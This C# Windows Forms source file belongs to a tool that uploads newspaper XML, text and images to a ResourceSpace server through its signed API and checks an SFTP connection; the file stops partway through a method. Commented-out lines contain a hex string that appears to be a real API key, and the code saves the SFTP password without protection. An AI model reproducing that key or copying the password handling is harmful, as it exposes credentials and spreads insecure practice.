using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Data.SqlClient;
using System.IO;
using System.Net;
using System.Diagnostics;
using Renci.SshNet;
using Renci.SshNet.Sftp;
using System.Security.Cryptography;
using System.Xml;
using System.Xml.Serialization;
using System.Runtime.Serialization.Json;
using System.Threading;
using System.Threading.Tasks;

namespace FRS_DUT
{
    public partial class frmMain : Form
    {
        Thread uploadThread;
        Thread vzsdvsdasdfThread;
        SettingClass settingClass;
        Setting setting;
        SqlConnection m_conn;
        List<Collections> m_collections;
        List<ResourceTypes> m_resourcetypes;
        List<SearchResult> m_searchResult;
        List<string> m_linkResource;
        bool m_stopped;
        ConfigHandler config;
        public frmMain()
        {
            InitializeComponent();
            settingClass = new SettingClass();
            m_stopped = true;
            m_linkResource = new List<string>();
            config = new ConfigHandler();
        }



        private bool ValidateDataUpload()
        {
            if (string.IsNullOrEmpty(this.txt_RS_Url.Text.Trim()))
            {
                MessageBox.Show("ResouceSpace URL is empty!");
                return false;
            }
            if (string.IsNullOrEmpty(this.txt_RS_Key.Text.Trim()))
            {
                MessageBox.Show("ResouceSpace API Key is empty!");
                return false;
            }
            if (string.IsNullOrEmpty(this.txt_RS_Login.Text.Trim()))
            {
                MessageBox.Show("ResouceSpace Login is empty!");
                return false;
            }

            return true;
        }

        private bool ValidateData()
        {
            string strApp = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            if (string.IsNullOrEmpty(this.txt_LinuxIP.Text.Trim()))
            {
                MessageBox.Show("Host Name/IP Address is empty!");
                return false;
            }
            if (string.IsNullOrEmpty(this.txt_LinuxPort.Text.Trim()))
            {
                MessageBox.Show("Port is empty!");
                return false;
            }
            if (string.IsNullOrEmpty(this.txt_LinuxLogin.Text.Trim()))
            {
                MessageBox.Show("Login Name is empty!");
                return false;
            }
            if (string.IsNullOrEmpty(this.txt_LinuxPass.Text.Trim()))
            {
                MessageBox.Show("Password is empty!");
                return false;
            }

            if (string.IsNullOrEmpty(txt_Root.Text.Trim()))
            {
                MessageBox.Show("Working Directory is empty!");
                return false;
            }
            
            return true;
        }


        private void frmMain_Load(object sender, EventArgs e)
        {

            string strApp = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
   //         string strApp1 = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;

//            MessageBox.Show();
            setting = settingClass.GetSetting("");
 
            txt_RS_Login.Text = setting.strRSUserName;
            txt_RS_Url.Text = setting.strRSUrl;
            txt_RS_Key.Text = setting.strRSKey;
            txt_RS_SourceDir.Text = setting.strRSSourceDir;

            nd_meta_Title.Text = setting.strMetaIDTitle;
            nd_meta_SubTitle.Text = setting.strMetaIDSubTitle;
            nd_meta_Pub_Date.Text = setting.strMetaIDPubDate;
            nd_meta_CreateDate.Text = setting.strMetaIDCreateDate;
            nd_meta_Content.Text = setting.strMetaIDContent;

            nd_meta_Dept.Text = setting.strMetaIDDept;
            nd_meta_Page.Text = setting.strMetaIDPage;

            if (setting.strRelateAll == "1")
                cb_RelateAll.Checked = true;
            else
                cb_RelateAll.Checked = false;

            LoadUserCollectionResourceTypes(false, false);
            
           
            txt_LinuxPass.Text = setting.strLinuxPassword;
            txt_LinuxPort.Text = setting.strLinuxPort;
            txt_LinuxIP.Text = setting.strLinuxServer;
            txt_LinuxLogin.Text = setting.strLinuxUserName;
            txt_Root.Text = setting.strRoot;


        }

        private bool Apply_DB_Setting(bool bMsg, bool bValidate)
        {
            try
            {
                if (bValidate)
                {
                    if (ValidateData() == false) return false;
                }

                string strApp = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                setting.strRSUserName = txt_RS_Login.Text.Trim();
                setting.strRSUrl = txt_RS_Url.Text.Trim();
                setting.strRSKey = txt_RS_Key.Text.Trim();

                setting.strRSSourceDir = txt_RS_SourceDir.Text.Trim();

                setting.strMetaIDTitle = nd_meta_Title.Text.Trim();
                setting.strMetaIDContent = nd_meta_Content.Text.Trim();

                setting.strMetaIDSubTitle = nd_meta_SubTitle.Text.Trim();
                setting.strMetaIDPubDate = nd_meta_Pub_Date.Text.Trim();
                setting.strMetaIDCreateDate = nd_meta_CreateDate.Text.Trim();

                setting.strMetaIDPage = nd_meta_Page.Text.Trim();
                setting.strMetaIDDept = nd_meta_Dept.Text.Trim();

                if (cb_Text_Type.SelectedIndex >= 0)
                    setting.strTextCollection = Convert.ToString(cb_Text_Type.Items[cb_Text_Type.SelectedIndex]);
                else
                    setting.strTextCollection = "";
                if (cb_Pic_Type.SelectedIndex >= 0)
                    setting.strPicCollection = Convert.ToString(cb_Pic_Type.Items[cb_Pic_Type.SelectedIndex]);
                else
                    setting.strPicCollection = "";

                if (cb_Resource_Type.SelectedIndex >= 0)
                    setting.strResourceType = Convert.ToString(cb_Resource_Type.Items[cb_Resource_Type.SelectedIndex]);
                else
                    setting.strResourceType = "<Auto identification>";

                if (cb_RelateAll.Checked)
                    setting.strRelateAll = "1";
                else
                    setting.strRelateAll = "0";


                setting.strLinuxPassword = txt_LinuxPass.Text.Trim();
                setting.strLinuxPort = txt_LinuxPort.Text.Trim();
                setting.strLinuxServer = txt_LinuxIP.Text.Trim();
                setting.strLinuxUserName = txt_LinuxLogin.Text.Trim();


                settingClass.SaveSetting(setting);

                if (!LoadUserCollectionResourceTypes(false, false))
                {
                    if (bMsg)
                    {
                        MessageBox.Show("Login Fail!");
                    }
                }
                else
                {
                    if (bMsg)
                        MessageBox.Show("Login OK!");
                }
                return true;
            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.Message);
                return false;
            }
        }

        private void btn_Apply_Click(object sender, EventArgs e)
        {
            Apply_DB_Setting(true, true);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (!m_stopped)
            {
                MessageBox.Show("Upload process is already running, please stop it first!");
                return;
            }

            this.Close();
        }


        private bool Test_Linux(bool bMsg)
        {
            try
            {
                SftpClient sftpclient = new SftpClient(txt_LinuxIP.Text.Trim(), Convert.ToInt32(txt_LinuxPort.Text.Trim()), txt_LinuxLogin.Text.Trim(), txt_LinuxPass.Text.Trim());
                sftpclient.Connect();
/*                                string localFilename = "D:\\process_list.txt";
                                string remoteFilename = "/opt/bitnami/resourcespace/2002/Dec/process_list.txt";

                                string strTempPath = "2002/Dec/1";
                                string[] subpaths = strTempPath.Split('/');
                                using (var fileStream = File.OpenRead(localFilename))
                                {
                                    string strPath = "/opt/bitnami/resourcespace/";
                                    foreach (string subpath in subpaths)
                                    {
                                        strPath = strPath + subpath + "/";

                                        var fileExist = sftpclient.ListDirectory(strPath);
                                        if (fileExist == null)
                                        {
                                            sftpclient.CreateDirectory(strPath);
                                        }
                                    }
                                    sftpclient.UploadFile(fileStream, remoteFilename);
                                }
*/
                if (bMsg)
                {
                    string strPath = txt_Root.Text;
                    if (!strPath.EndsWith("/"))
                        strPath = strPath + "/";

                    bool fileExist = sftpclient.Exists(strPath);
                    if (!fileExist)
                    {
                        MessageBox.Show("FRS Working Directory does not exist");
                    }
                    else
                        MessageBox.Show("Test OK!");
                }
                sftpclient.Disconnect();
                sftpclient = null;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return false;
            }

            return true;
        }

        private void btn_TestLinux_Click(object sender, EventArgs e)
        {
            Test_Linux(true);
        }

        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            Apply_DB_Setting(false, false);
            
            setting.strRoot = txt_Root.Text.Trim();
            string strApp = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            settingClass.SaveSetting(setting);
        }

        static string ComputeSha256Hash(string rawData, Encoding enc)
        {
            // Create a SHA256   
            using (SHA256 sha256Hash = SHA256.Create())
            {
                // ComputeHash - returns byte array  
                byte[] bytes = sha256Hash.ComputeHash(enc.GetBytes(rawData));

                // Convert byte array to a string   
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < bytes.Length; i++)
                {
                    builder.Append(bytes[i].ToString("x2"));
                }
                return builder.ToString();
            }
        }


        
        string GetWebRequestResult(string idUrl)
        {
            string strResult = "OK";
            //try the URI, fail out if not successful 
            HttpWebRequest request;
            HttpWebResponse response;
            try
            {
                request = (HttpWebRequest)WebRequest.Create(idUrl);
                request.Method = "GET";
                response = (HttpWebResponse)request.GetResponse();
            }
            catch
            {
                strResult = "Error";
                return strResult;
            }

            if (response.StatusCode == HttpStatusCode.OK)
            {
                Stream receiveStream = response.GetResponseStream();
                StreamReader readStream = null;
                if (response.CharacterSet == null)
                {
                    readStream = new StreamReader(receiveStream);
                }
                else
                {
//                    readStream = new StreamReader(receiveStream.  Encoding.GetEncoding(response.CharacterSet));
                    readStream = new StreamReader(receiveStream, Encoding.UTF8);
                }

                strResult = readStream.ReadToEnd();
                response.Close();
                readStream.Close();
            }
            else
            {
                strResult = "Error";
                return strResult;
            }
            return strResult;
        }


        string GetWebRequestResult_Post(string idUrl, string postData, string strSign, string strUserCode, Encoding enc)
        {
            string strResult = "OK";
            //try the URI, fail out if not successful 
            HttpWebRequest request;
            HttpWebResponse response;
            try
            {


                request = (HttpWebRequest)WebRequest.Create(idUrl);

                string strUser = "user=" + strUserCode;
//                var data_user = Encoding.UTF8.GetBytes(strUser);
                var data_user = enc.GetBytes(strUser);

                string str_sign = "&sign=" + strSign;
//                var data_sign = Encoding.UTF8.GetBytes(str_sign);
                var data_sign = enc.GetBytes(str_sign);

                postData = postData.Replace("&", "[!AND!]");

                string str_query = "&query=" + postData;
//                string str_query = postData;
//                var data_query = Encoding.UTF8.GetBytes(str_query);
                var data_query = enc.GetBytes(str_query);

//                string str_authmode = "&authmode=" + txt_RS_Key.Text.Trim();
//                string str_authmode = "&authmode=userkey";
  //              var data_authmode = Encoding.ASCII.GetBytes(str_authmode);

//                string strPara = strUser + str_sign + str_query + str_authmode;
//                string strPara = str_query + str_authmode;
//                string strPara = str_query;
  //              var data_Para = Encoding.UTF8.GetBytes(strPara);

                request.Method = WebRequestMethods.Http.Post;

                request.AllowAutoRedirect = true;
  //              request.UseDefaultCredentials = false;
//                request.PreAuthenticate = true;
                //request.Credentials = CredentialCache.DefaultCredentials;
      //          request.Credentials = new NetworkCredential("founder", strSign);


//                request.ContentType = "multipart/form-data";
                request.ContentType = "application/x-www-form-urlencoded";
                //request.ContentLength = data_Para.Length;
                request.ContentLength = data_user.LongLength + data_sign.LongLength + data_query.Length;
                //                request.ContentLength = data_user.Length + data_sign.Length+ data_query.Length + data_authmode.Length;
//                using (var stream = request.GetRequestStream())
  //              {
//                    stream.Write(data_Para, 0, data_Para.Length);
//                    stream.Write(data_sign, 0, data_sign.Length);
  //                  stream.Write(data_query, 0, data_query.Length);
    //                stream.Write(data_authmode, 0, data_authmode.Length);
    //            }
                    var stream = request.GetRequestStream();
                    stream.Write(data_user, 0, data_user.Length);

//                    request.ContentLength = data_sign.Length;
                    stream = request.GetRequestStream();
                    stream.Write(data_sign, 0, data_sign.Length);

                    stream = request.GetRequestStream();
                    stream.Write(data_query, 0, data_query.Length);

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (Exception ex)
            {
                strResult = "Error" + ex.Message;
                return strResult;
            }

            if (response.StatusCode == HttpStatusCode.OK)
            {
                Stream receiveStream = response.GetResponseStream();
                StreamReader readStream = null;
                if (response.CharacterSet == null)
                {
                    readStream = new StreamReader(receiveStream);
                }
                else
                {
                    //                    readStream = new StreamReader(receiveStream.  Encoding.GetEncoding(response.CharacterSet));
                    readStream = new StreamReader(receiveStream, Encoding.UTF8);
 //                   readStream = new StreamReader(receiveStream, Encoding.Default);
                }

                strResult = readStream.ReadToEnd();
                response.Close();
                readStream.Close();
            }
            else
            {
                strResult = "Error";
                return strResult;
            }
            return strResult;
        }


        
        private string GetURL(string strQuery)
        {        

            String ApiIDquery = "user=" + txt_RS_Login.Text.Trim() + strQuery;
            //            String idHash = "095788aefe8802e86ab59f65753a6038aa2f37338f0c718ad89f6fc4ae04f0e3" + ApiIDquery;
            String idHash = txt_RS_Key.Text.Trim() + ApiIDquery;
            idHash = Uri.EscapeUriString(idHash);
            String apiIDCode = ComputeSha256Hash(idHash, Encoding.UTF8);
            String idLowerCode = apiIDCode.ToLower();

            String escApiIDquery =  Uri.EscapeUriString(ApiIDquery);

            string idUrl = txt_RS_Url.Text.Trim() + "/api/?" + escApiIDquery + "&sign=" + idLowerCode;
//            if (txt_SourceDir.Text.Trim().EndsWith("/"))
//                idUrl = txt_RS_Url.Text.Trim() + "api/?" + escApiIDquery + "&sign=" + idLowerCode;

            return idUrl;
        }

/*
        private string GetURL_test(string strQuery)
        {
            //
            String ApiIDquery = "user=" + txt_RS_Login.Text.Trim() + strQuery;
//            String ApiIDquery = strQuery;
            //            String idHash = "095788aefe8802e86ab59f65753a6038aa2f37338f0c718ad89f6fc4ae04f0e3" + ApiIDquery;
            String idHash = txt_RS_Key.Text.Trim() + ApiIDquery;
//            String idHash = ApiIDquery;
            idHash = Uri.EscapeUriString(idHash);
            String apiIDCode = ComputeSha256Hash(idHash);
            String idLowerCode = apiIDCode.ToLower();

            String escApiIDquery = Uri.EscapeUriString(ApiIDquery);

            string idUrl = txt_RS_Url.Text.Trim() + "/api/?" + escApiIDquery + "&sign=" + idLowerCode;
            if (txt_SourceDir.Text.Trim().EndsWith("/"))
                idUrl = txt_RS_Url.Text.Trim() + "api/?" + escApiIDquery + "&sign=" + idLowerCode;

            return idUrl;
        }
*/

        private string GetURL_Post(string strQuery, ref string idLowerCode, Encoding enc)
        {

            String ApiIDquery = "user=" + txt_RS_Login.Text.Trim() + strQuery;
            //            String idHash = "095788aefe8802e86ab59f65753a6038aa2f37338f0c718ad89f6fc4ae04f0e3" + ApiIDquery;
            String idHash = txt_RS_Key.Text.Trim() + ApiIDquery;
//            idHash = Uri.EscapeUriString(idHash);
            String apiIDCode = ComputeSha256Hash(idHash, enc);
//            String idLowerCode = apiIDCode.ToLower();
            idLowerCode = apiIDCode.ToLower();

//            String escApiIDquery = Uri.EscapeUriString(ApiIDquery);
            String escApiIDquery = ApiIDquery;

            string idUrl = escApiIDquery + "&sign=" + idLowerCode;
//            if (txt_SourceDir.Text.Trim().EndsWith("/"))
//                idUrl = escApiIDquery + "&sign=" + idLowerCode;

            return idUrl;
        }


        private bool LoadUserCollectionResourceTypes(bool bMsg, bool bFailMsg)
        {

            try
            {
                cb_Pic_Type.Items.Clear();
                cb_Text_Type.Items.Clear();
                cb_Pic_Type.Items.Add("");
                cb_Text_Type.Items.Add("");

                
                string strResult = GetWebRequestResult(GetURL("&function=get_user_collections"));
                strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
                strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);

                strResult = strResult.Replace("\"ref\"", "\"Ref\"");

                if (strResult == "Error")
                {
                    if (bFailMsg)
                        MessageBox.Show("Get User Collection Fail");
                    return false;
                }



                m_collections = new List<Collections>(JsonHelper.JsonDeserialize<Collections[]>(strResult));
                for (int i = 0; i < m_collections.Count; i++)
                {
                    if (Convert.ToInt32(m_collections[i].Ref) < 0) continue;

                    Collections nitem = m_collections[i];
                   cb_Pic_Type.Items.Add(nitem.name);
                   cb_Text_Type.Items.Add(nitem.name);

                   if (nitem.name == setting.strTextCollection)
                       cb_Text_Type.SelectedIndex = cb_Text_Type.Items.Count - 1;

                   if (nitem.name == setting.strPicCollection)
                       cb_Pic_Type.SelectedIndex = cb_Pic_Type.Items.Count - 1;
                    //                    MessageBox.Show(nitem.username);
                }
                if (cb_Pic_Type.Items.Count > 0 && cb_Pic_Type.SelectedIndex<0)
                    cb_Pic_Type.SelectedIndex = 0;
                if (cb_Text_Type.Items.Count > 0 && cb_Text_Type.SelectedIndex < 0)
                    cb_Text_Type.SelectedIndex = 0;

                //****************************************************************
                //; get resource types
                //****************************************************************
                strResult = GetWebRequestResult(GetURL("&function=get_resource_types"));
                strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
                strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);

                strResult = strResult.Replace("\"ref\"", "\"Ref\"");

                if (strResult == "Error")
                {
                    if (bFailMsg)
                        MessageBox.Show("Get Resource type Fail");
                    return false;
                }

                cb_Resource_Type.Items.Clear();
                cb_Resource_Type.Items.Add("<Auto identification>");
                
                m_resourcetypes = new List<ResourceTypes>(JsonHelper.JsonDeserialize<ResourceTypes[]>(strResult));

                for (int i = 0; i < m_resourcetypes.Count; i++)
                {
                    if (Convert.ToInt32(m_resourcetypes[i].Ref) < 0) continue;

                    ResourceTypes nitem = m_resourcetypes[i];
                    cb_Resource_Type.Items.Add(nitem.name);

                    if (nitem.name == setting.strResourceType)
                        cb_Resource_Type.SelectedIndex = cb_Resource_Type.Items.Count - 1;

                    //                    MessageBox.Show(nitem.username);
                }
                if (cb_Resource_Type.Items.Count > 0 && cb_Resource_Type.SelectedIndex < 0)
                    cb_Resource_Type.SelectedIndex = 0;
            
            }
            catch (Exception ex)
            {
                if (bFailMsg)
                    MessageBox.Show(ex.Message);
                return false;
            }
            if (bMsg)
                MessageBox.Show("Test OK!");

            return true;
        }

        private void btn_Dir_Src_RS_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog dlg = new FolderBrowserDialog();
            dlg.SelectedPath = txt_RS_SourceDir.Text;
            if (dlg.ShowDialog() == DialogResult.OK)
                txt_RS_SourceDir.Text = dlg.SelectedPath;
        }

        private string GetCollectionID(bool b_Text)
        {
            if (b_Text)
            {
                if (cb_Text_Type.Items.Count <= 0)
                    return "";
                if (cb_Text_Type.SelectedIndex < 0)
                    return "";
            }
            else
            {
                if (cb_Pic_Type.Items.Count <= 0)
                    return "";
                if (cb_Pic_Type.SelectedIndex < 0)
                    return "";
            }

            for (int i = 0; i < m_collections.Count; i++)
            {
                if (b_Text)
                {
                    if (m_collections[i].name == Convert.ToString(cb_Text_Type.Items[cb_Text_Type.SelectedIndex]))
                    {
                        return m_collections[i].Ref;
                    }
                }
                else
                {
                    if (m_collections[i].name == Convert.ToString(cb_Pic_Type.Items[cb_Pic_Type.SelectedIndex]))
                    {
                        return m_collections[i].Ref;
                    }
                }
            }
            return "";
        }

        private string GetDefaultResourceTypeID()
        {
            for (int i = 0; i < m_resourcetypes.Count; i++)
            {
                if (m_resourcetypes[i].name == Convert.ToString(cb_Resource_Type.Items[cb_Resource_Type.SelectedIndex]))
                {
                    return m_resourcetypes[i].Ref;
                }
            }
            return "";
        }

        
        private string GetResourceTypeID(string strName)
        {

//            string strImageExt = "," + setting.strImageExt + ",";
 //           string strDocExt = "," + setting.strDocExt + ",";
 //           string strVideoExt = "," + setting.strVideoExt + ",";
 //           string strAudioExt = "," + setting.strAudioExt + ",";
 //           string strPDFExt = "," + setting.strPDFExt + ",";
            string strDefaultID = "2";
            for (int i = 0; i < m_resourcetypes.Count; i++)
            {
                if (m_resourcetypes[i].name.ToLower() == "doc" || m_resourcetypes[i].name.ToLower() == "document" 
                    || m_resourcetypes[i].name.ToLower() == "文件" || m_resourcetypes[i].name.ToLower() == "文檔")
                    strDefaultID = m_resourcetypes[i].Ref;
//                string strFileName_Lower = m_resourcetypes[i].name.ToLower();
//                if (m_resourcetypes[i].name.ToLower() == strName.ToLower())
//                {
//                    return m_resourcetypes[i].Ref;
//                }
//                else if (strFileName_Lower.EndsWith(".jpg") || strFileName_Lower.EndsWith(".jpeg") || 
  //                  strFileName_Lower.EndsWith(".gif") || strFileName_Lower.EndsWith(".eps") 
    //                || strFileName_Lower.EndsWith(".tif"))
                string strExt = config.GetKeyValue(m_resourcetypes[i].Ref + "_extension");
                strExt = "," + strExt + ",";
                if (strExt.Trim() != "")
                {
                    if (strExt.ToLower().IndexOf("," + strName.ToLower() + ",") >= 0)
                    {
                        return m_resourcetypes[i].Ref;
                    }
                }
/*                else if (strDocExt.ToLower().IndexOf("," + strName.ToLower() + ",") >= 0)
                {
                    return "2"; // 2-Doc
                    //                    b_text = true;
                }
                else if (strPDFExt.ToLower().IndexOf("," + strName.ToLower() + ",") >= 0)
                {
                    if (m_resourcetypes[i].name.ToLower() == "pdf")
                        return m_resourcetypes[i].Ref;
                }
//                else if (strFileName_Lower.EndsWith(".mov") || strFileName_Lower.EndsWith(".mpeg") || strFileName_Lower.EndsWith(".mp4") || strFileName_Lower.EndsWith(".mpg"))
                else if (strVideoExt.ToLower().IndexOf("," + strName.ToLower() + ",") >= 0)
                {
                    if (m_resourcetypes[i].name.ToLower() == "video")
                        return m_resourcetypes[i].Ref;
                }
//                else if (strFileName_Lower.EndsWith(".mp3") || strFileName_Lower.EndsWith(".wav"))
                else if (strAudioExt.ToLower().IndexOf("," + strName.ToLower() + ",") >= 0)
                {
                    if (m_resourcetypes[i].name.ToLower()=="audio")
                        return m_resourcetypes[i].Ref;
                }
*/
            }
            return strDefaultID;
        }


        private string ReplaceNewDept(string strName)
        {
            string strNewPageName = config.GetKeyValue("PageConv");
            string[] pagename_arr = strNewPageName.Split(',');
            for (int i = 0; i < pagename_arr.Length; i++)
            {
                if (pagename_arr[i].Split('=')[0].ToLower() == strName.ToLower())
                    return pagename_arr[i].Split('=')[1].ToUpper();
            }
            return strName.ToUpper();
        }
        
        
        private string Replace_Characters(string strInput)
        {
            strInput = strInput.Replace("\r\n", "");
            strInput = strInput.Replace("\r", "");
            strInput = strInput.Replace("\n", "");
            strInput = strInput.Replace("+", "＋");

//            strInput = strInput.Replace("\"", "＂");
            strInput = strInput.Replace("&", "＆");
            strInput = strInput.Replace("／", "$^^-$^^-$^^-");
    //        strInput = strInput.Replace("#", "＃");
      //      strInput = strInput.Replace("+", "＋");
        //    strInput = strInput.Replace(":", "：");
          //  strInput = strInput.Replace("\\", "＼");
            //strInput = strInput.Trim();
            return strInput.Trim();
        }


        private string Replace_Characters_Content(string strInput)
        {
//            strInput = strInput.Replace("\r\n", "\r");
  //         strInput = strInput.Replace("\r", "");
    //        strInput = strInput.Replace("\n", "\r");
            strInput = strInput.Replace("\"", "＂");
            strInput = strInput.Replace(" ", "");
            strInput = strInput.Replace("&", "＆");
            strInput = strInput.Replace("#", "＃");
            strInput = strInput.Replace("+", "＋");
            strInput = strInput.Replace(":", "：");
            strInput = strInput.Replace("\\", "＼");
            strInput = strInput.Trim();
            return strInput.Trim();
        }


        private void AddPageRelation(ref string strAllRelated, ref bool bFail)
//        private void AddPageRelation(ref string strAllRelated)
        {
            try
            {
                string strResult = GetWebRequestResult(GetURL("&function=relate_all_resources&related=" + strAllRelated));
                strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
                strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);
                if (strResult.ToLower() != "true")
                {
                    Global.WriteToFile("Related Files Fail " + strAllRelated, false);
//                    i_Fail_Count = i_Fail_Count + 1;
                    bFail = true;
  //                  continue;
                }
            }
            catch (Exception ex)
            {
                Global.WriteToFile("Related Files Fail " + strAllRelated, false);
                //i_Fail_Count = i_Fail_Count + 1;
                bFail = true;
                //          continue;
            }
            strAllRelated = "";
        }

        private void parseXML(string strXMLFileName, ref string strTitle, ref string strSubTitle, ref List<PicInfo> strPicNameArr, ref bool b_Process, ref string strPubDate, ref string strContent, ref List<PageInfo> PageInfoArr, ref string strAllRelated)
        {
            XmlDocument xmlDoc = new XmlDocument();
            xmlDoc.Load(strXMLFileName);
            if (xmlDoc != null)
            {
                XmlNodeList nodeNews = xmlDoc.GetElementsByTagName("news");
                XmlNodeList nodePage = xmlDoc.GetElementsByTagName("page");
                XmlNodeList nodeCategory = xmlDoc.GetElementsByTagName("category");
                XmlNodeList nodeDescription = xmlDoc.GetElementsByTagName("description");
                XmlNodeList nodeNumber = xmlDoc.GetElementsByTagName("number");
                XmlNodeList nodeCode = xmlDoc.GetElementsByTagName("code");
                
                XmlNodeList nodeArticle = xmlDoc.GetElementsByTagName("Article");
                XmlNodeList nodePicture = xmlDoc.GetElementsByTagName("Picture");
                XmlNodeList nodeTitle = xmlDoc.GetElementsByTagName("MainTitle");
                XmlNodeList nodeSubTitle = xmlDoc.GetElementsByTagName("SubTitle");

                XmlNodeList nodeContent = xmlDoc.GetElementsByTagName("Content");

//                PageInfoArr = newst<PageInfo>();
                if (nodeNews != null && nodePage != null)
                {
                    if (nodeNews.Count > 0)
                    {

                        string strDate = strXMLFileName.Substring(strXMLFileName.LastIndexOf("\\") + 1, 8);
                        string strYYYY = strDate.Substring(0, 4);
                        string strMM = strDate.Substring(4, 2);
                        string strDD = strDate.Substring(6, 2);
                        strPubDate = strYYYY + "-" + strMM + "-" + strDD;
                        PageInfoArr.Clear();
                        for (int i = 0; i < nodePage.Count; i++)
                        {
                            PageInfo pinfo = new PageInfo();
                            pinfo.Number = "";
                            pinfo.Desc = "";
                            pinfo.Code = "";
                            pinfo.Category = "";
                            for (int k = 0; k < nodePage[i].ChildNodes.Count; k++)
                            {
                                if (nodePage[i].ChildNodes[k].LocalName == "number")
                                {
                                    pinfo.Number = nodePage[i].ChildNodes[k].InnerText;
                                }
                                if (nodePage[i].ChildNodes[k].LocalName == "description")
                                {
                                    pinfo.Desc = nodePage[i].ChildNodes[k].InnerText;

                                    if (pinfo.Desc.ToLower().StartsWith("so"))
                                        pinfo.Desc = pinfo.Desc.ToLower().Replace("so", "S0");

                                    pinfo.Desc = pinfo.Desc.ToUpper();
                                }
                                if (nodePage[i].ChildNodes[k].LocalName == "category")
                                {
                                    pinfo.Category = nodePage[i].ChildNodes[k].InnerText;
                                }
                                if (nodePage[i].ChildNodes[k].LocalName == "code")
                                {
                                    pinfo.Code = nodePage[i].ChildNodes[k].InnerText;
                                }
                            }
                            PageInfoArr.Add(pinfo);                        
                        }
                    
                    }
                }


                if (nodeArticle != null)
                {
                    if (nodeArticle.Count > 0)
                        b_Process = true;
                }
                
                if (nodePicture != null)
                {
                    if (nodePicture.Count > 0)
                    {
                        XmlNodeList nodeLocation = xmlDoc.GetElementsByTagName("Location");
                        {
                            if (nodeLocation != null)
                            {
                                for (int i = 0; i < nodeLocation.Count; i++)
                                {
                                    if (nodeLocation[i].InnerText != null)
                                    {
                                        for (int k = strPicNameArr.Count - 1; k >= 0; k--)
                                        {
                                            if (strPicNameArr[k].strPicName == nodeLocation[i].InnerText)
                                                strPicNameArr.RemoveAt(k);
                                        }
                                        
                                        PicInfo pinfo = new PicInfo();
                                        pinfo.strPicName = nodeLocation[i].InnerText;
//                                        strPicNameArr.Add(nodeLocation[i].InnerText);
                                        pinfo.strSubTitle = "";

                                         if (nodeLocation[i].ParentNode.NextSibling != null)
                                         {
                                             if (nodeLocation[i].ParentNode.NextSibling.LocalName.ToLower() == "subtitle" ||
                                                 nodeLocation[i].ParentNode.NextSibling.LocalName.ToLower() == "maintitle")
                                             {
                                                 pinfo.strSubTitle = nodeLocation[i].ParentNode.NextSibling.InnerText;
                                                 pinfo.strSubTitle = Replace_Characters(pinfo.strSubTitle);
                                             }
                                         }

                                        strPicNameArr.Add(pinfo);
                                    }
                                }
                            }
                        }
                    }
                }


                if (nodeTitle != null)
                {
                    if (nodeTitle.Count > 0)
                    {
                        for (int i = 0; i < nodeTitle.Count; i++)
                        {
                            strTitle = strTitle + " " +nodeTitle[i].InnerText;
                        }
                    }
                }
                if (nodeSubTitle != null)
                {
                    for (int i = 0; i < nodeSubTitle.Count; i++)
                    {
                        if (nodeSubTitle.Count > 0)
                        {
                            if (i == nodeSubTitle.Count - 1)
                            {
                                strSubTitle = nodeSubTitle[i].InnerText;
                                strTitle = nodeSubTitle[i].InnerText;
                            }
                            //strSubTitle = strSubTitle + nodeSubTitle[i].InnerText;
                        }
                    }
                }

                if (nodeContent != null)
                {
                    for (int i = 0; i < nodeContent.Count; i++)
                    {
                        if (nodeContent.Count > 0)
                            strContent = strContent + nodeContent[i].InnerText;
                    }
                }
            
            
            }
//            strTitle = Replace_Characters_Content(strTitle);
            strTitle = Replace_Characters(strTitle);
            strSubTitle = Replace_Characters(strSubTitle);
            strContent = Replace_Characters_Content(strContent);

            //**********************
//            if (strContent.Length > 2)
  //              strContent = strContent.Substring(0, 2);

            //if (strSubTitle.Trim()!="")
            //strTitle = strTitle + " " +strSubTitle;
        }

        private void Add_To_Collection(string strCollection, string strResult, string strFileName, ref bool bFail)
        {
//            string strCollection = GetCollectionID(b_text);
            if (strCollection != "")
            {
                try
                {
                    int i_ref_id = Convert.ToInt32(strResult);
                    strResult = GetWebRequestResult(GetURL("&function=add_resource_to_collection&resource=" + strResult + "&collection=" + strCollection));
                    strResult = Encoding.UTF8.GetString(Encoding.Convert(Encoding.Unicode, Encoding.UTF8, Encoding.Unicode.GetBytes(strResult)));
                    strResult = System.Text.RegularExpressions.Regex.Unescape(strResult);
                    if (strResult.ToLower() != "true")
                    {
                        Global.WriteToFile("Add to Collection Fail " + strFileName, false);
//                        i_Fail_Count = i_Fail_Count + 1;
                        bFail = true;
                    }
                }
                catch (Exception ex)
                {
                    Global.WriteToFile("Add to Collection Fail " + strFileName, false);
                //    i_Fail_Count = i_Fail_Count + 1;
                    bFail = true;
                }
            }
        }


        private void SetSubTitle(string strResult, string strFileName, string strSubTitle, ref bool bFail, Encoding enc)
        {
            try
            {
                int i_ref_id = Convert.ToInt32(strResult);

                string strSign = "";
                string struel = GetURL_Post("&function=update_field&resource=" + strResult + "&field=" + nd_meta_SubTitle.Value.ToString() + "&value=" + strSubTitle, ref strSign, enc);
                strResult = GetWebRequestResult_Post(txt_RS_Url.Text.Trim() + "/api/", struel, strSign, txt_RS_Login.Text.Trim(), enc);
                
